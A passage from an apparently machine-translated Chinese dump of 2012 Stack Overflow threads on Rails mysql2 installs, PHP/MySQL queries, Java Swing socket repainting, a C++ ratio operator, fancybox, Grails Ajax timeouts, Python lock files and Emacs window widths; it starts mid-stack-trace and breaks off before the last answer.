from /usr/lib/ruby/gems/1.8/gems/bundler-1.0.7/lib/bundler/runtime.rb:62:in `each'
from /usr/lib/ruby/gems/1.8/gems/bundler-1.0.7/lib/bundler/runtime.rb:62:in `require'
from /usr/lib/ruby/gems/1.8/gems/bundler-1.0.7/lib/bundler/runtime.rb:51:in `each'
from /usr/lib/ruby/gems/1.8/gems/bundler-1.0.7/lib/bundler/runtime.rb:51:in `require'
from /usr/lib/ruby/gems/1.8/gems/bundler-1.0.7/lib/bundler.rb:112:in `require'
from /home/aaalsubaie/ajhezaty.com/releases/20120411095320/config/application.rb:7
from /home/aaalsubaie/ajhezaty.com/releases/20120411095320/vendor/bundle/ruby/1.8/gems/railties-3.2.1/lib/rails/commands.rb:39:in `require'
from /home/aaalsubaie/ajhezaty.com/releases/20120411095320/vendor/bundle/ruby/1.8/gems/railties-3.2.1/lib/rails/commands.rb:39
from script/rails:6:in `require'
from script/rails:6 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-26T22:51:25.423

这可能与您没有直接关系，但我遇到了完全相同的问题，我认为我的回答可能会帮助其他人解决这个问题：

```
sudo apt-get install libmysql-ruby
sudo apt-get install libmysqlclient-dev
sudo gem install mysql2 
```

这对我有用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-13T18:14:11.713

如果您使用的是 Mac，请使用 Homebrew 安装 MySQL，`brew install mysql`然后您就可以安装 gem。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-11T09:16:41.380

命令应该是这样的：

```
gem install mysql -- --with-mysql-config=/usr/local/mysql/bin/mysql_config 
```

选项“with-mysql-config”指的是“mysql_config”工具，而不是配置文件。

你最好是 mkmf.log 文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-28T02:30:54.383

sudo apt-get install libmysqlclient-dev 系统会安装另外两个lib：mysql-common libmysqlclient16

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-09T10:26:08.920

首先你必须运行这个命令：

```
sudo apt-get install libmysqlclient-dev 
```

然后你可以运行这个：

```
gem install mysql2 
```

它应该是工作..

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-06T18:20:37.460

“bundle exec rails console”针对捆绑器的 Gemfile 运行，但您使用 ruby​​gems 安装了 mysql2。您需要运行：

```
gem uninstall mysql2              # uninstall mysql2 from system
bundle exec gem uninstall mysql2  # uninstall mysql2 from bundler
bundle config build.mysql2 --with-mysql-config=/usr/bin/mysql_config  # set build option for mysql2 gem
bundle install                    # reinstall mysql2
bundle exec rails console         # start rails console using the rails exec installed via bundler 
```

附加说明：如果您正在使用乘客并且刚刚更新了 Ruby 版本，请确保重新安装乘客并更新您的 httpd.conf 以成功启动服务器。

# php - SQL LIMIT 查询不工作

> ID：10102270
> 
> 赞同：0
> 
> 时间：2012-04-11T08:16:36.973
> 
> 标签：php, mysql, limit

我有以下 PHP 代码：

```
<?php
  include 'DBConnect.php';
  $conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');
  $query = "SELECT * FROM telejoke.jokes LIMIT 2";
  $data = mysql_query($query) or die('Error, insert query failed' . mysql_error());
  $info = mysql_fetch_array( $data ); 
  mysql_close($conn);
  echo json_encode($info);   
?> 
```

例如，如果我设置 LIMIT 2，我希望只收集表中的前 2 行，编码为 JSON 数组并回显。不管这个 LIMIT 数字是多少，`echo json_encode($info);`它都会打印出整个表格。

尝试`echo json_encode($data);`导致空输出。

帮助表示赞赏。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:20:21.687

尝试这个...

```
$info = array();
while ($row = mysql_fetch_array($data)) {
  $info[] = $row;
}

echo json_encode($info); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:21:16.413

尝试这样做：

```
SELECT * FROM telejoke.jokes LIMIT 0,2 
```

或者

```
SELECT * FROM jokes LIMIT 0,2 
```

# android - 创建自定义可绘制资源以处理不同的徽标

> ID：10102278
> 
> 赞同：0
> 
> 时间：2012-04-11T08:17:10.173
> 
> 标签：android, android-layout

我正在为三个不同的社团构建一个应用程序。该集团的每个社团都有自己的网站，是其他网站的克隆，徽标和域除外。因此，例如，我有：

logoA.jpeg

logoB.jpeg

logoC.jpeg

对于社会。A、B 和 C。

http://socA.it **/homepage/default.aspx** _

http://socB.it **/homepage/default.aspx** _

http://socC.it **/homepage/default.aspx** _

用于主页链接等。站点的布局完全相同。

我对我的应用程序要做的是从网站的页面中检索数据。在我的应用程序的启动活动中，注册用户可以选择在哪个站点登录和工作。一旦他登录，他就可以从他选择的网站/社会中获取他需要的信息，这些信息会包含在我的应用程序中。

我显然构建了一个应用程序来从所有站点检索数据，但我正在寻找一种优雅（当然也是正确）的方式来处理不同的域/徽标。作为关注域，我将用户在登录时选择的域保存在用户首选项中，并在需要时将其检索为 base_url（域）。

问题是：如何处理徽标？我有三个可以显示的不同徽标，并且我在 drawable* 文件夹中为每个分辨率都有一个副本。我认为我可以做的是在每个活动的每个 onCreate 事件中添加一个 if 语句，以检查用户偏好并显示正确的徽标（或使用在其他地方创建的方法 getMyLogo()），但这很无聊.. 可能是最好为每种情况创建一个自定义可绘制文件夹以处理所有不同的场景：

drawable drawable-A-ldpi drawable-A-mdpi drawable-A-hdpi drawable-B.ldpi ... ?

任何建议表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:25:22.867

据我所知，这是不可能的，最干净的方法是在 SocietyHelper 的行中有一个名为 something 的类，并使用 getLogo() 和 getUrl() 的静态方法。唯一不“干净”的是您不能在 xml 中定义徽标。如果您的徽标始终位于图像视图中，您可以创建一个 ImageView 子类，可能称为 LogoImageView，它实际上只是使用正确的徽标初始化 ImageView。

# java - 不会从正在运行的线程 java 内部调用 Repaint()

> ID：10102285
> 
> 赞同：2
> 
> 时间：2012-04-11T08:17:43.710
> 
> 标签：java, swing

我有一个 JFrame，上面有一个 JPanel，我正在尝试使用paintComponent() 对其进行一些自由手绘。现在，我从 mouseDragged 方法内部更改 xPOS 和 yPOS 变量，然后调用 repaint()，所以它工作正常

```
//**PROGRAM 1**-My DrawPanel Class
  public class DrawPanel extends JPanel implements Runnable, MouseMotionListener{
    int xpos = 0;
    int ypos = 0;
    String message;
    DrawPanel(){
        //constructor ini
        addMouseMotionListener(this);
        setBackground(Color.green);
        setSize(500, 400);
        setBounds(10, 10, 500, 400);
        }

    public void paintComponent(Graphics g) {

      g.setColor(Color.red);
      g.fillOval(xpos, ypos, 5, 5);
      }

    @Override
    public void mouseDragged(MouseEvent arg0) {
     xpos= arg0.getX();
         ypos= arg0.getY();
    //   s.SendData(xpos,ypos);
        repaint();
    }

    public void run() {

        try{
            while((message = reader.readLine())!=null) {
                int in = message.indexOf("#");
                xpos = Integer.parseInt(message.substring(0, in));
                ypos = Integer.parseInt(message.substring(in+1));
                System.out.print(xpos+" "+ypos);

                repaint();
            }}catch(Exception e){e.printStackTrace();}
    }

} 
```

我有一个线程，它通过套接字从其他一些java程序接受一些新坐标，我能够接受它们，我的

```
System.out.print(xpos+" "+ypos); 
```

工作正常，但之后的 repaint() 方法似乎不起作用，没有错误，没有任何反应。

仅供参考，我提到的另一个 java 程序具有相同的结构，我将坐标从这个 java 程序发送到那个，

```
//   s.SendData(xpos,ypos); 
```

并且可以从线程内部调用 repaint() 方法。但似乎无法理解，为什么它没有发生在这一点上。任何帮助将不胜感激，谢谢。

**SSCCE**画笔服务器

```
 import java.awt.*;
 import java.awt.event.*;
//import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import javax.imageio.ImageIO;
import javax.swing.*;
public class PaintBrush {

DrawPanel dr = new DrawPanel();
 myFrame mf;
 Graphics g1;
 boolean flag=false;
 server s;
 BufferedReader reader;
PaintBrush(){
myFrame mf = new myFrame();
s = new server();
}

public static void main(String[] args) {

    new PaintBrush();
   }

public class ButtonPanel extends JPanel{
ButtonPanel(){
    add(new myButton());
}
 }

public class DrawPanel extends JPanel implements Runnable, MouseMotionListener{

int xpos = 0;
 int ypos = 0;
String message;

DrawPanel(){
    //constructor ini
    addMouseMotionListener(this);
    setBackground(Color.green);
    setSize(500, 400);
    setBounds(10, 10, 500, 400);
    //s = new server();

}

public void paintComponent(Graphics g) {

  g.setColor(Color.red);
  g.fillOval(xpos, ypos, 5, 5);

}

@Override
public void mouseDragged(MouseEvent arg0) {
     xpos= arg0.getX();
     ypos= arg0.getY();
     s.SendData(xpos,ypos);
    repaint();
}

@Override
public void run() {
    try{

        while((message = reader.readLine())!=null) {

            int in = message.indexOf("#");
            xpos = Integer.parseInt(message.substring(0, in));
            ypos = Integer.parseInt(message.substring(in+1));
           // System.out.print(xpos+" "+ypos);
           repaint();
        }}catch(Exception e){e.printStackTrace();}
}

}
 public class myFrame extends JFrame{
 myFrame(){
     DrawPanel dr = new DrawPanel();
    //setBackground(Color.black); 
    setResizable(false);
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
   setVisible(true);
    setSize(665,490);
    getContentPane().add(BorderLayout.CENTER,dr);
    getContentPane().add(BorderLayout.NORTH, new ButtonPanel());
 }
}public class myButton extends JButton{

 myButton(){
     setText("PaintBrushServer");
    // addActionListener(new listen());

 }

 }

public class server {
  ServerSocket ssock;
 Socket clientSocket;
 PrintWriter writer;
 DataOutputStream os = null;
 server(){
     //ini server
      try {
        ssock = new ServerSocket(42422);
        System.out.println("waiting");
        clientSocket = ssock.accept();
        System.out.println(clientSocket.getRemoteSocketAddress()+" connected\n");
        //writer = new PrintWriter(.getOutputStream());
        InputStreamReader streamReader = new InputStreamReader(clientSocket.getInputStream());
        reader = new BufferedReader(streamReader);
        os = new DataOutputStream(clientSocket.getOutputStream());
        new Thread(dr).start();
      } catch (IOException e) {

        e.printStackTrace();
    }
 }
 public void SendData(int x, int y){
    try{ 
        os.writeBytes(x+"#"+y+"\n");
    }catch(Exception e){e.printStackTrace();}
 }

}
} 
```

**SSCCE-PaintBrushClient**

```
import java.awt.*;
import java.awt.event.MouseEvent;
import java.awt.event.MouseMotionListener;
import java.io.*;
import java.net.*;
import javax.swing.*;
public class Client {
int xpos = 0;
int ypos = 0;
Boolean flag = false;
ClientConnect cc ;
DataOutputStream os = null;

BufferedReader reader;
Client(){
//server connect
ClientConnect cc = new ClientConnect();

}
public static void main(String[] args) {

new Client();
}

public class ClientConnect {
private Socket sock;
String message;
ClientConnect(){
   try {
    sock = new Socket("127.0.0.1", 42422);
    InputStreamReader streamReader = new InputStreamReader(sock.getInputStream());
    reader = new BufferedReader(streamReader);
    os = new DataOutputStream(sock.getOutputStream());
     //sr = new ServerReader();
     //sr.start();
    new myFrame();

} catch (UnknownHostException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
}
}}

public void SendData(int x, int y){
try{ 
    os.writeBytes(x+"#"+y+"\n");
}catch(Exception e){e.printStackTrace();}
}
public class DrawPanel extends JPanel implements Runnable, MouseMotionListener{

 String message;
DrawPanel(){
    //constructor ini
    addMouseMotionListener(this);
    setBackground(Color.green);
    setSize(500, 400);
    setBounds(10, 10, 500, 400);
}

public void paintComponent(Graphics g) {
  g.setColor(Color.red);
  g.fillOval(xpos, ypos, 5, 5);

}

@Override
public void run() {

    // TODO Auto-generated method stub
       try{

        while((message = reader.readLine())!=null) {
            int in = message.indexOf("#");
            xpos = Integer.parseInt(message.substring(0, in));
            ypos = Integer.parseInt(message.substring(in+1));
            //System.out.println(message);
            System.out.println(xpos+" "+ypos);
            repaint();

        }}catch(Exception e){e.printStackTrace();}
}

@Override
public void mouseDragged(MouseEvent arg0) {
    // TODO Auto-generated method stub
     xpos= arg0.getX();
     ypos= arg0.getY();
     //flag = true;
     //System.out.println(xpos);
     //SendData(xpos,ypos);
    repaint();
}

public void mouseMoved(MouseEvent arg0) {
    }
}
 public class myButton extends JButton{
 myButton(){
 setText("PaintBrushClient");
 //addActionListener(new listen());
 }
 }
public class ButtonPanel extends JPanel{
ButtonPanel(){
    add(new myButton());
}
}

public class myFrame extends JFrame{
 myFrame(){
 DrawPanel dr = new DrawPanel();
 new Thread(dr).start();
setResizable(false);
 setBackground(Color.black); 
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    setVisible(true);
    setSize(665,490);
    getContentPane().add(BorderLayout.CENTER,dr);
    getContentPane().add(BorderLayout.NORTH, new ButtonPanel());

 }
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T10:21:34.227

1.  您永远不会启动线程来读取数据（哦，您是在服务器中执行的。为什么要发布四次重复的代码，除了一些注释掉的行><）
2.  一个线程中的 xpos/ypos 更新可能不会被另一个线程看到。至少它们应该是易变的，但我更喜欢 setXYPosition() 方法：

    ```
    public synchronized void setXYPosition(int x, int y) {
      this.xpos = x;
      this.ypos = y;
      repaint();
    } 
    ```

3.  你为什么要写字节和读（字符）行？
4.  不需要其他人建议的 revalidate() ，因为您是直接绘画，而不是更改布局/组件层次结构。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T23:02:01.387

好的，我最终让它在我的电脑上工作，所以我想这可能会让你感兴趣：

这里有两件事：

1.  当你覆盖时`paintComponent`，你仍然应该调用 super:`super.paintComponents(g);`在其余部分之上绘制之前。

2.  制作您的 xpos ypos `volatile`，因为您从单独的线程访问它们。

您的代码中还缺少一个覆盖方法。最终，我把它全部修好了，我可以在一帧中绘制，同时看到它在两帧中都被绘制（启动了两个不同的程序）。

我不会抱怨设计和其他东西。还有其他帖子有很好的建议。

唯一的一件事，我认为没有被提及，但是如果您在两个程序之间共享类。将它们放在另一个文件中并多次使用，而不是复制/粘贴它们。您的几个课程就是这种情况。如果两者之间只有细微差别，只需添加一个您可以更改的参数以指示您所处的情况。

好的，我在咆哮，但实际上当您在服务器框架中绘制时，客户端会做出反应并绘制相同的东西。就个人而言，在您的情况下，我会将客户端称为服务器，将服务器称为客户端。通常，服务器“侦听”客户端，在这种情况下，您绘制的是您的客户端，而您看到它复制的是您的服务器，但这只是语义。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T08:50:54.963

1)`JTextArea`用于显示传入`String`或发件人`Object`，`ServerSocked`如果您打算使用`Stylled Text`，则查看`JTextPane`

2）`SwingWorker`用于打开、读取和关闭（中`finally block`）的`Socket`，有两种选择：

*   使用`publish()`or`process()`分发传入或from `Chars`，因为声明输出将在 EDT 上，我建议将 wrap 方法放入`String``Object``Socket``JTextCompoent#append``invokeLater`

*   更容易等待`Socked`如果结束并在`done()`看跌期权`String`或`Object`期望`JComponent`

4) 肯定可以`Runnable#Thread`用于分发`String`或`Object`从`Socket`Swing GUI 分发，但我建议必须将输出包装到`invokeLater`,

`Socket + SwingWorker + JTextArea`3）关于这个论坛上的一些非常好的代码

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-12T06:21:47.007

上述问题的答案是在 PaintBrushServer 上的线程内部没有调用 repaint() 方法，而在 PaintBrushClient 上调用它是......

只需`DrawPanel dr = new DrawPanel();`从 myFrame(JFrame) 类中删除，就像我一开始就已经这样做了。

谢谢大家的意见和建议，还有@andrewThompson，我现在知道如何提供一个好的SSCCE ..lol

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T08:26:27.487

你说你有一个接受坐标的线程，这是Event Dispatch Thread吗？如果是这样，那么它可能会阻止对 UI 的任何更新。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-04-11T08:25:39.687

在进行其他一些计算时，您可以使用`SwingUtilities.invokelater( ... )`它来更新您的 UI。在你的情况下

```
repaint() 
```

甚至更好

```
revalidate();
repaint(); 
```

应该在`invokeLater`可运行的实现中调用。

# c++ - 比率类中的 Operator/= 以错误的方式工作

> ID：10102287
> 
> 赞同：2
> 
> 时间：2012-04-11T08:18:09.810
> 
> 标签：c++

请看这段代码：

```
#include <iostream>
using namespace std;

class Ratio
{
    public:
        Ratio(int a=0, int b=1) : num(a), den(b) {}
        Ratio& operator/=(const Ratio&);
        void print() {cout << num << "/" << den << endl;}
    private:
        int num, den;
};

Ratio& Ratio::operator/=(const Ratio& r)
{
    num*=r.den;
    den*=r.num;
    return *this;
}

int main()
{
    Ratio x(1,2), y(2,5);
    y/=x;
    y.print();
} 
```

执行这段代码后，（y）应该是5/4，我亲手计算了好几次！但是在打印 (y) 后的输出中，它显示 4/5！它不应该被它颠倒！

我的代码哪里出了问题？真的我检查了好几次，似乎没有任何问题！这是一个家庭作业:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T08:21:19.207

你是如何决定它应该是 5/4 的？(2/5) / (1/2) = 4/5，这是正确的结果。当您期望 5/4 时，也许您正在计算 x/=y。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:22:25.633

`y/=x``y = y/x`与which is `2/5 / 1/2`which is相同`2/5 x 2/1`=`4/5`

# php - mysql Count Distinct 并使用 php 获取结果

> ID：10102294
> 
> 赞同：0
> 
> 时间：2012-04-11T08:18:49.340
> 
> 标签：php, mysql, count, distinct

我有一个这样的mysql查询：

```
$topicreplycount = mysql_query('SELECT COUNT(DISTINCT post_msg_id) FROM phpbb_attachments WHERE topic_id = '.$row['topic_id'].' AND post_msg_id < '.$row['post_msg_id']); 
```

并希望使用以下方法获得结果：

```
$topicreplycount = mysql_result($topicreplycount); 
```

所以假设表中有 4 个这样的 post_msg_id：

2956 2957 2957 2958

并且当前 $row['post_msg_id'] 是 2958，有 3 个 post_msg_ids 小于我要与之比较的那个，并且只有 2 个不同的 post_msg_ids，因为其中两个是相同的，我期待“2”是回来

但它似乎不起作用，我这样做正确吗？使用此方法，我根本没有在 $topicreplycount 变量中返回任何内容

我很确定 usign mysql_result($topicreplycount) 一定是错的，但不知道用什么代替

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:25:47.130

试试这个：

```
$sql = mysql_query('SELECT COUNT(DISTINCT post_msg_id) AS num_topics FROM phpbb_attachments WHERE topic_id = '.$row['topic_id'].' AND post_msg_id < '.$row['post_msg_id']);
$result = mysql_result($sql);
$row = mysql_fetch_array($result) or die(mysql_error());
echo $row['num_topics']; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:25:28.827

使用[mysql_result](http://uk.php.net/mysql_result)您需要至少指定行号，以便

```
$topicreplycount = mysql_result($topicreplycount,0); 
```

应该管用。因为您使用了 COUNT() 函数，所以只会返回一个结果，这很好。

但是，建议不要使用 mysql_ 系列函数。它们实际上已被弃用（不是正式的，但即使是 PHP 文档也建议不要使用它们）。您应该切换到 mysqli_ 或者更好的是 PDO。

# jquery - 我如何使fancybox熄灯效果更宽？

> ID：10102296
> 
> 赞同：0
> 
> 时间：2012-04-11T08:18:56.193
> 
> 标签：jquery, html, css, fancybox

在我的网站[www.staygold-design.com](http://www.staygold-design.com)上，我在投资组合区域下的按钮上有一个 fancybox jquery 脚本。按钮是“网页设计”。当我点击fancybox确实出现时，但问题是熄灯效果一直向左..我希望它覆盖我的整个容器div！我要改变什么来解决这个问题。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:30:51.280

这是由于您网站的水平布局和（fancybox v1.3.x 的设计问题）`viewport`计算方式。

作为一种解决方法，在加载了 fancybox css 文件后，添加这个 css 内联声明：

```
<style type="text/css">
 #fancybox-overlay {
   position: fixed !important;
 }
</style> 
```

# string - 两个字符串 S1 和 S2 与 S1 的最后一个字符匹配的相等子序列的数量

> ID：10102297
> 
> 赞同：1
> 
> 时间：2012-04-11T08:19:09.063
> 
> 标签：string, algorithm, dynamic-programming

给定两个不同长度的字符串 S1 和 S2，找到 S1 和 S2 的相等子序列的数量与 S1 的最后一个字符匹配的有效方法是什么。

> 例如）
> 
> S1 = ayb
> 
> S2 = axbxxb

在这种情况下，存在两个相等的子序列，

```
 "b"  => S1[2],S2[2]
 "b"  => S1[2],S2[5]
 "ab" => S1[0],S2[0] and S1[2],S2[2]
 "ab" => S1[0],S2[0] and S1[2],S2[5] 
```

我知道这可以使用动态编程来解决，如果有人提出有效解决这个问题的想法，那就太好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T10:37:35.297

这基本上是一个正则表达式匹配问题。

首先让我们摆脱“最后一个字符匹配”的条件。我们希望将问题简化为“无条件的等子序列的普通数量问题”。

假设 S1="a [1] a [2] ...a [n] Z"。让 S1'="a [1] a [2] ...a [n] "。进一步假设在 S2 中有 N 次出现 Z。对于每一次出现，我们可以写

假设在 S2 中有 N 次出现 Z。对于每次出现的*i*，我们可以写为 S2 [i] ="b [1] b [2] ...b [k [i]] Zb [k [i] +1] ..."。假设 S2'="b [1] b [2] ...b [k [i]] "。现在解决 S1' 和 S2' [i]的简单问题，对于 1..N 中的每个 i。

现在，如何解决简单的问题？

取较短的字符串，说它是 S1。现在让我们写它`"abc…t"`。将其转换为`".*a?.*b?.*…t?.*"`. 这是你的正则表达式。您现在需要计算正则表达式匹配 S2 的方式有多少。可以使用基于 NFA 的算法来完成匹配。

要实际计算匹配数，需要了解基于 NFA 的匹配算法的内部工作原理。在任何给定时刻都有一组处于活动状态的状态。一个状态可以一分为二，或者两个状态可以合并。如果遇到错误的字符，状态可能会死亡。因此，您将 1 分分配给初始状态。当一个状态分裂时，每个新状态都会继承父级的分数。当两个状态合并时，新状态得到分数的总和。当一个国家死亡时，它的分数就会下降。

我不确定这是否与您所说的动态编程方法有什么不同。最多有 2 ^N个匹配项，因此在某些输入上，这*将*需要很长时间。

**更新**：看起来应该也可以直接解决“最后一个字符匹配”问题，而不是将其简化为普通问题。假设在 S2 中出现 2 次 Z：S2="ab...pZq...yZ"。（无论如何都可以忽略最后一个 Z 之后的所有字符）。可以从 S2: 构建一个正则表达式`".*a?.*b?.*…p?.*(Z|Z?.*q?.*…y?.*Z)"`。更多的事件以相同的方式处理。需要一个看似多余的正则表达式来维持正确的匹配数量（不仅仅是存在匹配的事实）。

# python - 从一些“不均匀”的 XML 构建数据库记录的最佳方法是什么

> ID：10102299
> 
> 赞同：0
> 
> 时间：2012-04-11T08:19:24.857
> 
> 标签：python, mysql, xml, structure

我有一些想要在 python 中使用 lxml 方法解析的 XML。解析完元素后，我希望能够比较一些结构化对象（寻找增量）。

我需要解析大约 50 个 XML 文件，并且 XML 中的数据采用“不均匀”形式（我不确定正确的名称是什么）。

简化示例 XML：

```
<ID 1>
 <parameter A>
 <parameter B>
</ID 1>
<ID 2>
 <parameter A>
 <parameter B>
 <parameter C> 
</ID 2>
<ID 3>
 <parameter A>
</ID 3> 
```

我将如何创建一个合适的数据库（mySQL？）结构，我可以使用它通过 ID 隔离每个对象，并比较每个参数元素。

我不确定这是否有意义——我不太熟悉正确的术语。

实际的源 xml 是此处列出的所有文件：http: [//www.nationalarchives.gov.uk/aboutapps/pronom/droid-signature-files.htm](http://www.nationalarchives.gov.uk/aboutapps/pronom/droid-signature-files.htm)

这些文件是过去几年更新的相同结构的版本。我不需要数据库中的所有 XML 元素，只需要一个子集，从版本号、发布日期开始，然后是两个主要部分中的各个 ID 和字节模式。

将它推入 mysql 可能不是最好的方法，但我想如果我这样做了，我会使用 python/html 前端来组合一个搜索/比较工具。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:26:28.143

在您的问题中，我的关键词是：“我不需要数据库中的所有 XML 元素，只需要一个子集”

鉴于您可以预先知道要比较的子集的所有元素，我建议使用一个表，其中每个数据元素都有一个列。这应该可以更轻松地处理您以后对数据的报告要求。

另一种按行存储元素的方法通常被认为是一种反模式，并且会使报告和比较变得更加困难。如果您事先不知道要比较此类策略的元素类型（或数量），则可能需要。

编辑：更明确地说，我认为该表将包含列： ID,Paramater1,Parameter2,Parameter3,Parameter4 其中 parameterx 是您正在查看的“可比较参数”之一 - 对于其中许多列可能保留为空，因为不存在这样的参数。

那么整个表只有一个表，每个 ID 在该表中只有一行。

# grails - 在 Grails 中的 Ajax 调用期间 Spring Security 中的会话超时

> ID：10102302
> 
> 赞同：0
> 
> 时间：2012-04-11T08:19:27.973
> 
> 标签：grails, spring-security

我是 grails 的新手。我正在使用 grails 1.3.7 和 spring security core 插件来保证安全。

我的应用程序有大部分的 ajax 调用。

当时会话到期时，我的 authAjax 方法发送 401 错误代码。

现在我的问题是如何在收到错误代码 401 时将用户重定向到登录页面。

非常感谢任何帮助。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:45:21.017

可能您需要在客户端进行操作。如果您将 jQuery 用于 ajax，则可以执行以下操作：

```
$.ajax({
  // your current ajax code
  statusCode: {
    401: function() {
      window.location.href = '/youAppContext/login'
    }
  }
}); 
```

您还可以为所有 jQuery ajax 调用设置它，通过`$.ajaxSetup`

# javascript - 如何实现 Facebook 聊天垂直滚动条样式？

> ID：10102304
> 
> 赞同：0
> 
> 时间：2012-04-11T08:19:34.310
> 
> 标签：javascript, jquery, html, css, scrollbar

> **可能重复：**
> [Facebook 在股票和聊天侧边栏中的水平滚动条](https://stackoverflow.com/questions/7299426/facebooks-horizontal-scrollbar-in-ticker-chat-sidebar)

我正在实现一个内部内容为 overflow-y: auto 的 div。但我需要更改滚动条的样式，使其类似于 Facebook 聊天滚动条样式。

代码：

```
<div style='overflow-y: auto; overflow-x:hidden;'>
<div id='divInner1'>Some Content</div>
<div id='divInner2'>Some Content</div>
<div id='divInner3'>Some Content</div>
<div id='divInner4'>Some Content</div>
<div id='divInner5'>Some Content</div>
</div> 
```

如何使用与 facebook 相同的样式为最外层的 div 设置垂直滚动条样式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:21:59.160

看看：[http ://areaaperta.com/nicescroll/demo.html](http://areaaperta.com/nicescroll/demo.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:25:12.133

我认为这必须为每个浏览器引擎单独设置样式。对于 Chrome 和 Safari，这里有一个很好的关于如何做到这一点的描述。 [http://www.webkit.org/blog/363/styling-scrollbars/](http://www.webkit.org/blog/363/styling-scrollbars/)

# python - 检查现有进程是否存在 - 如果存在，与它通信，否则创建一个新进程

> ID：10102312
> 
> 赞同：2
> 
> 时间：2012-04-11T08:20:23.107
> 
> 标签：python, concurrency

我确定这个问题之前已经被问过，但我找不到它。

我编写了一个 Python 程序，给定一个目录，它使用一个非常简单的启发式方法来确定如何“解包”它的内容以及目标目录。

每当完成新的下载时，就会执行该程序。如果大量下载几乎同时完成，我会得到很多进程同时解压东西。我想通过重写大部分程序来解决这个问题，一次只解压一个目录。

所以为了实现这一点，我想我会使用一个“lock/PID”文件，其中包含任何当前正在执行的程序的 PID。如果锁/PID 文件存在，新生成的进程应该简单地向`("queue", "D:/some/directory")`现有进程发送一些内容，并让该进程在完成当前解包后解包该目标。

我将如何在 Python 中实现这一点？这必须在 Windows 系统上工作，但在 GNU/Linux 上也是理想的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:24:55.007

如果只想检查PID文件是否存在，可以使用：[os.path](http://docs.python.org/library/os.path.html)

```
os.path.exists(path) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:52:05.823

因此，既然您已经在使用[Ben Finney 的 lockfile之类的东西](http://pypi.python.org/pypi/lockfile)

例子：

```
 from lockfile.pidlockfile import PIDLockFile
 lock = PIDLockFile('somefile')
 lock.acquire(timeout=3600)
 #do stuff
 lock.release() 
```

您可能希望与正在运行的守护程序通信，您应该让守护程序侦听某个套接字，然后从生成的进程向套接字发送数据。（例如 udp 套接字）

所以在守护进程中：

```
import socket
import traceback
import Queue
import threading
import sys

hostname = 'localhost'
port = 12368
#your lockfile magick here
# if you want one script to run each time, put client code here instead of seperate script
#if already running somehwere:
    #message = "hello"
    #sock = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
    #sock.sendto( message, (hostname, port) )
    #sys.exit(0)

que = Queue.Queue(0)

socket_ = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket_.bind((hostname, port))

class MyThread(threading.Thread):
    def run(self):
        while True: #maybe add some timeout here, so this process closes after a while
                    # but only stop if que.empty()
            message = que.get()
            print "handling message: %s" % message
            #handle message

t = MyThread()
t.start()

while True:
        try:
            #blocking call
            message, _ = socket_.recvfrom(8192) #buffer size
            print "received message: %s"  % message
            #queue message
            que.put(message)
        except (KeyboardInterrupt, SystemExit):
            raise
        except:
            traceback.print_exc() 
```

在客户端：

```
import socket
hostname = 'localhost'
port = 12368
message = "hello"
sock = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
sock.sendto( message, (hostname, port) ) 
```

如果您在同一台机器上运行所有这些，则可以使用“localhost”作为主机名。

另一方面，使用[多进程管道](http://docs.python.org/library/multiprocessing.html#pipes-and-queues)而不是套接字可能是正确的方法，但我还没有这方面的经验。此设置的额外好处是能够在不同的机器上运行服务器和客户端。

# emacs - 将框架中的所有 Emacs 窗口设置为给定宽度

> ID：10102313
> 
> 赞同：2
> 
> 时间：2012-04-11T08:20:25.307
> 
> 标签：emacs, elisp

我正在尝试编写一个函数，使 Emacs 框架中的所有窗口都为 120 个字符宽。到目前为止，我有这个：

```
(defun standard-width ()
  "makes the widht of the window 120, our coding standard"
  (interactive)
  (delete-other-windows)
  (set-frame-width (selected-frame) 120 )
  ) 
```

但是，我想在没有`delete-other-windows`电话的情况下完成这项工作。不幸的是，如果没有这个调用，总框架宽度是 120，在窗口之间共享。如何使总框架宽度（水平方向上的最大窗口数）* 120？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T09:06:23.570

